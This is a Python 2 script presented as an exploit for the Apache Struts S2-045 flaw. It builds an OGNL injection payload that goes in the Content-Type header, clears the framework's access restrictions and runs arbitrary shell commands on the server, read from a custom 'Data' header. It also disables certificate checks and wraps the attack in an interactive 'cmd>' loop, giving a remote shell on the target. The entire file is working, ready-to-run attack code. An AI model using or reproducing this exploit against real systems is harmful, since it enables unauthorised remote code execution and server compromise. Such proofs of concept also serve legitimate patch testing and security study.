##############################################################################
#
# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
"""
struts s2-045 exploit

Authors: 
Date: 2017/06/26 17:10:00
"""
#!/usr/bin/python
# -*- coding: utf-8 -*-

import ssl
import sys
import httplib
import urllib
import urllib2
import fileinput


def _run(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd=(@org.apache.struts2.ServletActionContext@getRequest().getHeader('Data')))."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload, 'Data': cmd}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request, context=ctx).read()
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page

if __name__ == "__main__":
#    _run(sys.argv[1], sys.argv[2])
#    sys.exit()

    if len(sys.argv) != 2:
        print 'Usage: s2-045 http://ubuntu:8080/struts2.5.10-showcase/index.action'
        sys.exit()

    while True:
        try:
            line = raw_input("cmd> ")
            _run(sys.argv[1], line.strip())
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
